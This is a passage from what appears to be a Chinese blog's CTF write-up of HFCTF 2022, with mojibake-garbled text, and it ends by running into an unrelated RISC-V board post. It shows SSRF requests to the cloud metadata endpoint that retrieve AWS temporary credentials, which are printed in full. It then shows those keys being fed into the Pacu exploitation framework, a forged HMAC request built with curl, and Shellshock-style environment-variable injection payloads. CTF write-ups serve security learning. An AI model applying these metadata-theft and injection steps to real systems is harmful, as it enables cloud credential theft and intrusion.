echo Lightsail: SSH-RSA added. fi service sshd restart echo Lightsail: sshd restarted. è·å–ç”¨æˆ·çš„ å…¬é’¥ @169.254.169.254/latest/meta-data/public-keys/0/openssh-key ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeALxPBYYbSgdhysw6ROMP4QiCLgmfJ6eWaCIrc4CQEmX+H99ul7QJ55Ze4sfWHUi0bOuV7KK/2wFaoQhM50WPsQQCZ1CfUuhhVZOgJg2NRpz5BIJB5fKrpqBXNk5JWFs7E+EShtMJG0vMrqudh25ju4TzbGNeZfBpcRedjWt1eM3K9qwFCpKf4246bw+kcY4cQp5uz/e/tYukeBmZQt2RAwyOZM/eNgGjutQzW1le3v3NiJvQBTe7pPIUXKWoZWJHS3NCLaU7OXnRNravFQx/BkC65ZadKZ6HlbYBzA7woWaJju9NG5Ac30ahDIYn4hxKZWSE7Spy5KFTrHjsovot ctf æŒ‰ç…§ä¸Šé¢çš„ writeupï¼Œæ˜¯ä¸æ˜¯è¿™ä¸ª credential èƒ½æ‹¿æ¥è·å–ç‚¹ä¸œè¥¿ï¼Ÿ POST /req_flag_server HTTP/1.1 Host: 54.64.248.8:13512 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://54.64.248.8:13512/ Content-Type: application/json Origin: http://54.64.248.8:13512 Content-Length: 111 Connection: close Pragma: no-cache Cache-Control: no-cache {\"op\":\"status\",\"path\":\"@169.254.169.254/latest/meta-data/iam/security-credentials/AmazonLightsailInstanceRole\"} ==&gt; { \"Code\" : \"Success\", \"LastUpdated\" : \"2022-03-20T17:50:57Z\", \"Type\" : \"AWS-HMAC\", \"AccessKeyId\" : \"ASIAXNYXRKXY3FIWO3IR\", \"SecretAccessKey\" : \"gLrAmH7oesxy2N1cyYoCvCYsm3MtzgKEQ92WQj1a\", \"Token\" : \"IQoJb3JpZ2luX2VjEHoaDmFwLW5vcnRoZWFzdC0xIkgwRgIhAOwNfPzcoek2NWC7n4j6WLnPcuRC0/xRGM8qOOuHbvmLAiEA83rhz5bHzuIqcghNa7HmDJkvvYjCPR9ASf5JXe65KBUqjQQI8///////////ARADGgw1MTA2MTM2MDc5MjEiDD6XXPv3G4oCW33bxyrhA7eVuy9ylhPGYC2U0sGn5VGwFdPnOndbCzNP9G+wmuzawCw47DJa1f/HpfiC6FSJwwuL3oJnoES/ixFEaFLxBAjcLEPsUwNyhaNftVNkzTR7WiHfzPspCQYR9JmemrbS67b44LnaVOsz1PDYyzkfbCLpi6s+AFS6wSaeXPjzuaqwKsj3K7GioGW0W9kvBvip7tb99ZhK03RRWQ/woT4oOGk+7UTFeM+lfWkW0zT+KBOZ3C5FA45mUeei6KqbQrW13ODnNrg4hvU0pDxyc1yeU7AvneFVwW5xuFkPz1ZqnQNwB+wnjU3kyQjhA6hWJR1mHXOjBbnNJep+chpllxiGojDIwMeLWD6FWK0AE6lP1wiHUqT313dt+9ZwnBxZba9EQd8X+zqAaXG03WztJXWTrR/hKVEuhqD/trCjQvKENxT62lyCfC0Tg66ZnrZrn8rAhYO+IEArGq80+dF1vs5eBAKxTLSEZkP7s35IoKW7xEUPDtHaK1xN0GHz/7bI1BfzL21WeKLD/tXNPBQx2P6+Ij5/bWJS/TsZKJpDHrEXWp5f/FAINNhKtwULaiaZk3PQC/ihEO/ymt+YDZNxGgqPlIptG8XMAtB48EPtVU6IaNVUOKWERccqI5KY5hEcO0ITkh8w49LdkQY6pAHpYAJ6ydBAKB88I5Yrbng1CpsYgLO+4oRihzWjk48uaODavdZvBKXl0R+Zplfz42WOdAywcCN93zytu9Jes2YTyr9tvh9uxnFAlKk2aNtMJ94YT5hKF46GAs1eEZjtDwt8lX3ysSlo4lTq91OS+kFyJTtIJqTcHnCpesWL+h9KVTATKRdUuGDYUH/C+LzdehiNWPoApGImMAPcoZsJ1/9J9mM8tA==\", \"Expiration\" : \"2022-03-21T00:10:21Z\" } æ‹¿ pacu è¯•äº†è¯•ã€‚ Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments. Created and maintained by Rhino Security Labs, Pacu allows penetration testers to exploit configuration flaws within an AWS account, using modules to easily expand its functionality. Current modules enable a range of attacks, including user privilege escalation, backdooring of IAM users, attacking vulnerable Lambda functions, and much more. $ pip3 install awscli ... $ docker run -it rhinosecuritylabs/pacu:latest â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢€â¡€â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â € â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢€â£¤â£¶â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£„â¡€â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â € â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢€â£¾â£¿â¡¿â ›â ‰â â €â €â ˆâ ™â »â£¿â£¿â£¦â €â €â €â €â €â €â €â €â €â €â €â €â €â €â € â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ›â ›â ‹â €â €â €â €â €â €â €â €â €â ˆâ »â£¿â£·â£€â£€â£€â£€â¡€â €â €â €â €â €â €â €â €â € â €â €â €â €â €â €â €â €â €â¢€â£€â£€â£€â£€â£€â£€â£€â£€â£€â£¤â£¤â£¤â£¤â£¤â£¤â£¤â£¤â£€â£€â €â €â €â €â €â €â¢»â£¿â£¿â£¿â¡¿â£¿â£¿â£·â£¦â €â €â €â €â €â €â € â €â €â €â €â €â €â €â €â €â¢€â£€â£€â£€â£ˆâ£‰â£™â£›â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡Ÿâ ›â ¿â¢¿â£¿â£·â£¦â£„â €â €â ˆâ ›â ‹â €â €â €â ˆâ »â£¿â£·â €â €â €â €â €â € â €â €â €â €â €â €â €â €â €â¢€â£€â£€â£ˆâ£‰â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£§â£€â£€â£€â£¤â£¿â£¿â£¿â£·â£¦â¡€â €â €â €â €â €â €â €â£¿â£¿â£†â €â €â €â €â € â €â €â €â €â €â €â €â €â¢€â£€â£¬â£­â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ¿â ›â¢›â£‰â£‰â£¡â£„â €â €â €â €â €â €â €â €â »â¢¿â£¿â£¿â£¶â£„â €â € â €â €â €â €â €â €â €â €â €â¢ â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â Ÿâ ‹â£â£¤â£¶â¡¿â£¿â£¿â ‰â »â â €â €â €â €â €â €â €â €â €â €â €â ™â¢»â£¿â£§â¡€ â €â €â €â €â €â €â €â €â¢ â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â Ÿâ ‹â£ â£¶â£¿â¡Ÿâ »â£¿â ƒâ ˆâ ‹â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢¹â£¿â£§ â¢€â£€â£¤â£´â£¶â£¶â£¶â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â Ÿâ â¢ â£¾â£¿â ‰â »â ‡â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢¸â£¿â£¿ â ‰â ›â ¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â â €â €â €â €â ‰â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â£¸â£¿â¡Ÿ â €â €â €â €â ‰â£»â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡€â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â£ â£¾â£¿â¡Ÿâ  â €â €â €â¢€â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¦â£„â¡€â €â €â €â €â €â£´â£†â¢€â£´â£†â €â£¼â£†â €â €â£¶â£¶â£¶â£¶â£¶â£¶â£¶â£¶â£¾â£¿â£¿â ¿â ‹â €â € â €â €â €â£¼â£¿â£¿â£¿â ¿â ›â ›â ›â ›â ›â ›â ›â ›â ›â ›â ›â ›â ›â ›â “â ’â ’â šâ ›â ›â ›â ›â ›â ›â ›â ›â €â €â ‰â ‰â ‰â ‰â ‰â ‰â ‰â ‰â ‰â ‰â €â €â €â €â € â €â €â €â£¿â£¿â Ÿâ â €â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â¡€â €â¢ â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£·â¡„â €â¢€â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£·â£†â €â¢°â£¿â£¿â£¿â €â €â €â£¿â£¿â£¿ â €â €â €â ˜â â €â €â €â¢¸â£¿â£¿â¡¿â ›â ›â¢»â£¿â£¿â¡‡â €â¢¸â£¿â£¿â¡¿â ›â ›â¢¿â£¿â£¿â¡‡â €â¢¸â£¿â£¿â¡¿â ›â ›â¢»â£¿â£¿â£¿â €â¢¸â£¿â£¿â£¿â €â €â €â£¿â£¿â£¿ â €â €â €â €â €â €â €â €â¢¸â£¿â£¿â¡‡â €â €â¢¸â£¿â£¿â¡‡â €â¢¸â£¿â£¿â¡‡â €â €â¢¸â£¿â£¿â¡‡â €â¢¸â£¿â£¿â¡‡â €â €â ¸â ¿â ¿â Ÿâ €â¢¸â£¿â£¿â£¿â €â €â €â£¿â£¿â£¿ â €â €â €â €â €â €â €â €â¢¸â£¿â£¿â¡‡â €â €â¢¸â£¿â£¿â¡‡â €â¢¸â£¿â£¿â¡‡â €â €â¢¸â£¿â£¿â¡‡â €â¢¸â£¿â£¿â¡‡â €â €â €â €â €â €â €â¢¸â£¿â£¿â£¿â €â €â €â£¿â£¿â£¿ â €â €â €â €â €â €â €â €â¢¸â£¿â£¿â£§â£¤â£¤â£¼â£¿â£¿â¡‡â €â¢¸â£¿â£¿â£§â£¤â£¤â£¼â£¿â£¿â¡‡â €â¢¸â£¿â£¿â¡‡â €â €â €â €â €â €â €â¢¸â£¿â£¿â£¿â €â €â €â£¿â£¿â£¿ â €â €â €â €â €â €â €â €â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â ƒâ €â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡‡â €â¢¸â£¿â£¿â¡‡â €â €â¢€â£€â£€â£€â €â¢¸â£¿â£¿â£¿â €â €â €â£¿â£¿â£¿ â €â €â €â €â €â €â €â €â¢¸â£¿â£¿â¡â ‰â ‰â ‰â ‰â €â €â €â¢¸â£¿â£¿â¡â ‰â ‰â¢¹â£¿â£¿â¡‡â €â¢¸â£¿â£¿â£‡â£€â£€â£¸â£¿â£¿â£¿â €â¢¸â£¿â£¿â£¿â£€â£€â£€â£¿â£¿â£¿ â €â €â €â €â €â €â €â €â¢¸â£¿â£¿â¡‡â €â €â €â €â €â €â €â¢¸â£¿â£¿â¡‡â €â €â¢¸â£¿â£¿â¡‡â €â ¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â €â €â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡Ÿ â €â €â €â €â €â €â €â €â ˜â ›â ›â ƒâ €â €â €â €â €â €â €â ˜â ›â ›â ƒâ €â €â ˜â ›â ›â ƒâ €â €â ‰â ›â ›â ›â ›â ›â ›â ‹â €â €â €â €â ™â ›â ›â ›â ›â ›â ‰â € No database found at /root/.local/share/pacu/sqlite.db Database created at /root/.local/share/pacu/sqlite.db What would you like to name this new session? hufu Session hufu created. Pacu - https://github.com/RhinoSecurityLabs/pacu Written and researched by Spencer Gietzen of Rhino Security Labs - https://rhinosecuritylabs.com/ This was built as a modular, open source tool to assist in penetration testing an AWS environment. For usage and developer documentation, please visit the GitHub page. Modules that have pre-requisites will have those listed in that modules help info, but if it is executed before its pre-reqs have been filled, it will prompt you to run that module then continue once that is finished, so you have the necessary data for the module you want to run. Pacu command info: list/ls List all modules load_commands_file &lt;file&gt; Load an existing file with list of commands to execute search [cat[egory]] &lt;search term&gt; Search the list of available modules by name or category help Display this page of information help &lt;module name&gt; Display information about a module whoami Display information regarding to the active access keys data Display all data that is stored in this session. Only fields with values will be displayed data &lt;service&gt; Display all data for a specified service in this session services Display a list of services that have collected data in the current session to use with the \"data\" command regions Display a list of all valid AWS regions update_regions Run a script to update the regions database to the newest version set_regions &lt;region&gt; [&lt;region&gt;...] Set the default regions for this session. These space-separated regions will be used for modules where regions are required, but not supplied by the user. The default set of regions is every supported region for the service. Supply \"all\" to this command to reset the region set to the default of all supported regions run/exec &lt;module name&gt; Execute a module set_keys Add a set of AWS keys to the session and set them as the default swap_keys Change the currently active AWS key to another key that has previously been set for this session import_keys &lt;profile name&gt;|--all Import AWS keys from the AWS CLI credentials file (located at ~/.aws/credentials) to the current sessions database. Enter the name of a profile you would like to import or supply --all to import all the credentials in the file. export_keys Export the active credentials to a profile in the AWS CLI credentials file (~/.aws/credentials) sessions/list_sessions List all sessions in the Pacu database swap_session Change the active Pacu session to another one in the database delete_session Delete a Pacu session from the database. Note that the output folder for that session will not be deleted exit/quit Exit Pacu Other command info: aws &lt;command&gt; Run an AWS CLI command directly. Note: If Pacu detects \"aws\" as the first word of the command, the whole command will instead be run in a shell so that you can use the AWS CLI from within Pacu. Due to the command running in a shell, this enables you to pipe output where needed. An example would be to run an AWS CLI command and pipe it into \"jq\" to parse the data returned. Warning: The AWS CLI's authentication is not related to Pacu. Be careful to ensure that you are using the keys you want when using the AWS CLI. It is suggested to use AWS CLI profiles to solve this problem console/open_console Generate a URL that will log the current user/role in to the AWS web console Pacu (hufu:No Keys Set) &gt; set_keys Setting AWS Keys... Press enter to keep the value currently stored. Enter the letter C to clear the value, rather than set it. If you enter an existing key_alias, that key's fields will be updated instead of added. Key alias [None]: hufu Access key ID [None]: ASIAXNYXRKXY3FIWO3IR Secret access key [None]: gLrAmH7oesxy2N1cyYoCvCYsm3MtzgKEQ92WQj1a Session token (Optional - for temp AWS keys only) [None]: IQoJb3JpZ2luX2VjEHoaDmFwLW5vcnRoZWFzdC0xIkgwRgIhAOwNfPzcoek2NWC7n4j6WLnPcuRC0/xRGM8qOOuHbvmLAiEA83rhz5bHzuIqcghNa7HmDJkvvYjCPR9ASf5JXe65KBUqjQQI8///////////ARADGgw1MTA2MTM2MDc5MjEiDD6XXPv3G4oCW33bxyrhA7eVuy9ylhPGYC2U0sGn5VGwFdPnOndbCzNP9G+wmuzawCw47DJa1f/HpfiC6FSJwwuL3oJnoES/ixFEaFLxBAjcLEPsUwNyhaNftVNkzTR7WiHfzPspCQYR9JmemrbS67b44LnaVOsz1PDYyzkfbCLpi6s+AFS6wSaeXPjzuaqwKsj3K7GioGW0W9kvBvip7tb99ZhK03RRWQ/woT4oOGk+7UTFeM+lfWkW0zT+KBOZ3C5FA45mUeei6KqbQrW13ODnNrg4hvU0pDxyc1yeU7AvneFVwW5xuFkPz1ZqnQNwB+wnjU3kyQjhA6hWJR1mHXOjBbnNJep+chpllxiGojDIwMeLWD6FWK0AE6lP1wiHUqT313dt+9ZwnBxZba9EQd8X+zqAaXG03WztJXWTrR/hKVEuhqD/trCjQvKENxT62lyCfC0Tg66ZnrZrn8rAhYO+IEArGq80+dF1vs5eBAKxTLSEZkP7s35IoKW7xEUPDtHaK1xN0GHz/7bI1BfzL21WeKLD/tXNPBQx2P6+Ij5/bWJS/TsZKJpDHrEXWp5f/FAINNhKtwULaiaZk3PQC/ihEO/ymt+YDZNxGgqPlIptG8XMAtB48EPtVU6IaNVUOKWERccqI5KY5hEcO0ITkh8w49LdkQY6pAHpYAJ6ydBAKB88I5Yrbng1CpsYgLO+4oRihzWjk48uaODavdZvBKXl0R+Zplfz42WOdAywcCN93zytu9Jes2YTyr9tvh9uxnFAlKk2aNtMJ94YT5hKF46GAs1eEZjtDwt8lX3ysSlo4lTq91OS+kFyJTtIJqTcHnCpesWL+h9KVTATKRdUuGDYUH/C+LzdehiNWPoApGImMAPcoZsJ1/9J9mM8tA== Keys saved to database. Pacu (hufu:hufu) &gt; run iam__bruteforce_permissions Running module iam__bruteforce_permissions... ... [iam__bruteforce_permissions] Allowed Permissions: ec2: get_associated_enclave_certificate_iam_roles get_console_screenshot get_host_reservation_purchase_preview s3: get_object_torrent head_bucket logs: è¯•äº†å‘ç°éƒ½æ²¡å•¥ç”¨ï¼Œè€Œä¸” pacu è¿™ä¸ªå·¥å…·è²Œä¼¼è¿˜æœ‰ç‚¹é—®é¢˜ã€‚ã€‚ æœ€åçœ‹äº†å¤§ä½¬çš„ wpï¼Œå‘ç° è¿˜æ˜¯å¾—å›åˆ°æœ€å¼€å§‹çš„ signature ä¸Šæ¥ã€‚ åŸæ¥ç”¨æ¥ç­¾åçš„æ˜æ–‡å°±æ˜¯é‚£ä¸² JSON å•Šï¼Œè‰ï¼ æˆ–è€…è¯´ï¼Œåº”è¯¥æ˜¯å¯¹ HTTP Request body éƒ¨åˆ†çš„å†…å®¹åšç­¾åï¼Ÿç”¨äºç­¾åçš„ key æ˜¯é‚£ä¸ª authorized_keys æ–‡ä»¶ã€‚ å¯†é’¥å°±æ˜¯ ssh å…¬é’¥ï¼ŒåŒ…æ‹¬æœ€åçš„ ctfï¼Œå³ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeALxPBYYbSgdhysw6ROMP4QiCLgmfJ6eWaCIrc4CQEmX+H99ul7QJ55Ze4sfWHUi0bOuV7KK/2wFaoQhM50WPsQQCZ1CfUuhhVZOgJg2NRpz5BIJB5fKrpqBXNk5JWFs7E+EShtMJG0vMrqudh25ju4TzbGNeZfBpcRedjWt1eM3K9qwFCpKf4246bw+kcY4cQp5uz/e/tYukeBmZQt2RAwyOZM/eNgGjutQzW1le3v3NiJvQBTe7pPIUXKWoZWJHS3NCLaU7OXnRNravFQx/BkC65ZadKZ6HlbYBzA7woWaJju9NG5Ac30ahDIYn4hxKZWSE7Spy5KFTrHjsovot ctf http://www.metools.info/code/c25.html æˆ–è€… https://tool.oschina.net/encrypt?type=2 æŠŠæ˜æ–‡æ”¹æˆ {\"op\": \"getflag\"}ï¼Œå†æ‹¿å»ç­¾åï¼Œå¾—åˆ° 25b4d583533d523e3eabf7d04798f9322f51bc69e13831b433ee2cc93a6de362 æ‰¾ä¸ªå¸¦æœ‰ IPv6 çš„æœºå™¨è¿›è¡Œå‘åŒ…ã€‚ POST /rpc HTTP/1.1 Host: [2406:da14:444:4e00:a393:91b2:27fd:7f3]:14571 User-Agent: python-requests/2.22.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive X-Signature: 25b4d583533d523e3eabf7d04798f9322f51bc69e13831b433ee2cc93a6de362 X-Sign-Method: HMAC-SHA256 X-Sign-Key-File: /home/ubuntu/.ssh/authorized_keys X-Flag-Server: http://[::1]:14571 Content-Length: 17 Content-Type: application/json Authorization: Basic Wzo6MV06MTQ1NzE= {\"op\": \"getflag\"} æˆ–è€… curl -i -s -k -X $'POST' \\ -H $'Host: [2406:da14:444:4e00:a393:91b2:27fd:7f3]:14571' -H $'User-Agent: python-requests/2.22.0' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Connection: keep-alive' -H $'X-Signature: 25b4d583533d523e3eabf7d04798f9322f51bc69e13831b433ee2cc93a6de362' -H $'X-Sign-Method: HMAC-SHA256' -H $'X-Sign-Key-File: /home/ubuntu/.ssh/authorized_keys' -H $'X-Flag-Server: http://[::1]:14571' -H $'Content-Length: 17' -H $'Content-Type: application/json' -H $'Authorization: Basic Wzo6MV06MTQ1NzE=' \\ --data-binary $'{\\\"op\\\": \\\"getflag\\\"}' \\ $'http://[2406:da14:444:4e00:a393:91b2:27fd:7f3]:14571/rpc' -v Check in å…³æ³¨â€DataConå¤§æ•°æ®å®‰å…¨åˆ†æç«èµ›â€å›å¤â€2022è™ç¬¦ç­¾åˆ°â€å³å¯è·å¾—flag RT Webezphpé¢˜ç›®ç»™äº† docker æ–‡ä»¶ï¼Œå–µå–µç•™äº†ä¸€ä»½é™„ä»¶æ”¾åœ¨ è¿™é‡Œ ã€‚ åˆå‡ºç°äº†ä¸€è¡Œ PHP ä»£ç çš„é¢˜ç›®ï¼Œæ¢¦å› TCTF 2021ï¼ˆ1linephpï¼‰ å•Š index.php &lt;?php (empty($_GET[\"env\"])) ? highlight_file(__FILE__) : putenv($_GET[\"env\"]) &amp;&amp; system('echo hfctf2022');?&gt; Dockerfile FROM php:7.4.28-fpm-buster LABEL Maintainer=\"yxxx\" ENV REFRESHED_AT 2022-03-14 ENV LANG C.UTF-8 RUN sed -i 's/http:\\/\\/security.debian.org/http:\\/\\/mirrors.163.com/g' /etc/apt/sources.list RUN sed -i 's/http:\\/\\/deb.debian.org/http:\\/\\/mirrors.163.com/g' /etc/apt/sources.list RUN apt upgrade -y &amp;&amp; \\ apt update -y &amp;&amp; \\ apt install nginx -y ENV DEBIAN_FRONTEND noninteractive COPY index.php /var/www/html COPY default.conf /etc/nginx/sites-available/default COPY flag /flag EXPOSE 80 CMD php-fpm -D &amp;&amp; nginx -g 'daemon off;' è¿™é¢˜éœ€è¦é€šè¿‡ç¯å¢ƒå˜é‡æ¥æ‰§è¡Œå‘½ä»¤ï¼Œåˆšå¼€å§‹æƒ³åˆ°çš„æ˜¯å‰ä¸ä¹… Pç‰› å‘çš„é‚£ä¸ªç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤çš„ï¼ŒOrzï¼ é‡åˆ°ç¯å¢ƒå˜é‡æ³¨å…¥ï¼Œå¯ä»¥è¿›è¡Œä¸‹åˆ—ä¸‰ç§æµ‹è¯•ï¼š Bashæ²¡æœ‰ä¿®å¤ShellShockæ¼æ´ï¼šç›´æ¥ä½¿ç”¨ShellShockçš„POCè¿›è¡Œæµ‹è¯•ï¼Œä¾‹å¦‚TEST=() { :; }; id; Bash 4.4ä»¥å‰ï¼šenv $'BASH_FUNC_echo()=() { id; }' bash -c \"echo hello\" Bash 4.4åŠä»¥ä¸Šï¼šenv $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello' ç»è¿‡é˜…è¯»dashå’Œbashçš„ä»£ç ï¼Œæˆ‘å‘ç°äº†è¿™æ ·ä¸€äº›å¯ä»¥å¯¼è‡´å‘½ä»¤æ³¨å…¥çš„ç¯å¢ƒå˜é‡ï¼š BASH_ENVï¼šå¯ä»¥åœ¨bash -cçš„æ—¶å€™æ³¨å…¥ä»»æ„å‘½ä»¤ ENVï¼šå¯ä»¥åœ¨sh -i -cçš„æ—¶å€™æ³¨å…¥ä»»æ„å‘½ä»¤ PS1ï¼šå¯ä»¥åœ¨shæˆ–bashäº¤äº’å¼ç¯å¢ƒä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤ PROMPT_COMMANDï¼šå¯ä»¥åœ¨bashäº¤äº’å¼ç¯å¢ƒä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤ BASH_FUNC_xxx%%ï¼šå¯ä»¥åœ¨bash -cæˆ–sh -cçš„æ—¶å€™æ‰§è¡Œä»»æ„å‘½ä»¤ åˆ©ç”¨æœ€åä¸€ä¸ªtrickï¼Œæˆ‘æˆåŠŸåœ¨CentOSä¸‹è§£å†³äº†æœ¬æ–‡å¼€å¤´æå‡ºçš„é—®é¢˜ã€‚ via æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤ ç„¶è€Œè¿™ä¸ªç¯å¢ƒé‡Œç”¨çš„ sh æŒ‡å‘çš„æ˜¯ dashï¼Œæµ‹è¯•äº†ä¸Šé¢çš„æ–¹æ¡ˆä¸å¯è¡Œã€‚ èµ›åæ‰çŸ¥é“å®é™…ä¸Šç”¨åˆ°äº† nginx äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶æ¥ä¸Šä¼  .soï¼Œå†ç»“åˆ LD_PRELOAD ç¯å¢ƒå˜é‡æ¥æ‰§è¡Œå‘½ä»¤ï¼Œåæ­£éƒ½å¾ˆéš¾æƒ³åˆ°çš„ trick äº†ã€‚ è¿™é‡Œè¦å‚è€ƒé™†é˜Ÿå†™çš„ hxp CTF 2021 - A New Novel LFIï¼Œé™†é˜Ÿ yydsï¼ ä½ ä»¥ä¸ºè¦æ‰“çš„æ˜¯ PHPï¼Œå®é™…ä¸Šæ˜¯è¦åˆ©ç”¨ Nginxï¼Œå‘œå‘œ ï¼ˆåé¢æœ‰ç©ºå†æ¥å¤ç°ï¼Œå’• å°ç»“é¢˜ç›®æ„Ÿè§‰å°± Misc ç›¸å¯¹è€Œè¨€æ¯”è¾ƒç®€å•äº†ï¼Œå…¶ä»–ç±»å‹çš„é¢˜ç›®éƒ½å•¥éš¾åº¦å•Šâ€¦â€¦ Orz å–µå–µå¥½èœå•Šï¼ˆ å®˜æ–¹ writeup ä¹Ÿå‡ºæ¥äº†ï¼š https://datacon.qianxin.com/blog/archives/414 ï¼ˆç•™ä¸€ä»½ pdf åœ¨ å’±è¿™é‡Œï¼Œä¾µåˆ  ï¼ˆæºœäº†æºœäº†å–µ","path":"2022/03/25/CTF_2022HFCTF/"},{"title":"EE | Sipeed è”ææ´¾ LicheeRV | 1 å¼€ç®±åŠä¸Šæ‰‹å…¥é—¨","text":"0x00 å¼•è¨€æœ€è¿‘ ä¸çŸ¥é“ä¸ºå•¥ å¯¹ç¡¬ä»¶åˆå¾ˆæ„Ÿå…´è¶£äº†ï¼Œå¯èƒ½æ˜¯å› ä¸ºå–µå–µçš„æ ‘è“æ´¾å‡ºäº†ç‚¹é—®é¢˜è·‘ä¸èµ·æ¥äº†ï¼Œäºæ˜¯æƒ³æ•´ç‚¹æ›¿ä»£çš„ä¸œè¥¿ã€‚ ç”±äºç–«æƒ…åŸå› å°æ ¡äº†ï¼Œå¿«é€’å¤§å¤šä¹Ÿä¸å‘è´§ï¼Œä¸è¿‡å­¦å¼Ÿä¹°äº†ä¸ª Sipeed è”ææ´¾ LicheeRV Dock å…¨å¿—D1å¼€å‘æ¿ï¼Œç„¶è€Œä»–ç©ä¸èµ·æ¥æ”¾ç€åƒç°äº†ï¼Œäºæ˜¯æ­£å¥½åˆé€‚å’±å°±æ‹¿è¿‡æ¥æŠ˜è…¾æŠ˜è…¾å¥½äº†ã€‚ï¼ˆå¥½è€¶ï¼Œæœ‰æ–°ç©å…·äº†ï¼ å•Šï¼Œæ˜¯å— RISC-V æ¶æ„çš„æ¿å­ï¼ ä¼—æ‰€å‘¨çŸ¥ï¼Œå–µå–µä¸€ç¯‡åšå®¢ä¸€èˆ¬ä¼šå†™å¾ˆå¤šä¸œè¥¿ã€‚è¿™ç¯‡åšå®¢å°±æ˜¯å–µå–µå¯¹è¿™å—æ¿å­çš„å¼€ç®±ä½“éªŒåŠä¸Šæ‰‹å…¥é—¨çš„æŠ˜è…¾è¿‡ç¨‹ï¼Œå’±å°½é‡å†™æ­£ç¡®çš„æ“ä½œï¼Œå¯èƒ½æœ‰è¯¯å¯¼æ€§æˆ–è€…å°è¯•å¤±è´¥çš„æ“ä½œæ”¾åœ¨äº†æ¯éƒ¨åˆ†çš„æœ€åé¢ï¼Œå°±ç•™ä½œä¸ªè®°å½•å§ã€‚ æ–‡ä¸­çš„å…ˆåé¡ºåºæœ‰æ‰€è°ƒæ•´ï¼Œä¸å½±å“æ•´ä½“é˜…è¯» hhhã€‚ ï¼ˆè®ºå–µå–µç¿»è½¦äº†å¤šå°‘æ¬¡ 0x01 å¼€ç®± &amp; æ¿å¡ä»‹ç»å–µå–µæ‰‹é‡Œçš„æ¿å­å¤§æ¦‚æ˜¯å›¾é‡Œçš„è¿™æ¬¾ï¼Œç›¸å¯¹è€Œè¨€æŒºä¾¿å®œçš„äº†ã€‚ é•¿ç›¸æ˜¯è¿™æ ·çš„ã€‚Dock åº•æ¿ä¸ŠåµŒå…¥äº†ä¸€å— RTL8723DS WiFiåŠè“ç‰™èŠ¯ç‰‡ã€‚è®¡ç®—æ¡é€šè¿‡åŒ M2 æ¥å£æ’å…¥åˆ°åº•æ¿ä¸Šã€‚ ç»„åˆèµ·æ¥æ˜¯è¿™æ ·çš„ã€‚ LicheeRV ç³»åˆ—æ˜¯ Lichee ç³»åˆ—ä¸‹çš„ RV å­ç³»åˆ—ï¼Œä¸»è¦ä¸º RISC-V å†…æ ¸çš„ Linux SBC äº§å“ã€‚ï¼ˆé¡ºä¾¿å€Ÿç”¨ä¸ªå›¾ æ ¸å¿ƒæ¿ä¸Šæ˜¯ä¸€é¢—å…¨å¿—ç§‘æŠ€çš„ D1 èŠ¯ç‰‡ã€‚ D1-H æ˜¯å…¨å¿—ç§‘æŠ€é¦–æ¬¾åŸºäºRISC-VæŒ‡ä»¤é›†çš„èŠ¯ç‰‡ï¼Œé›†æˆäº†é˜¿é‡Œå¹³å¤´å“¥64ä½C906æ 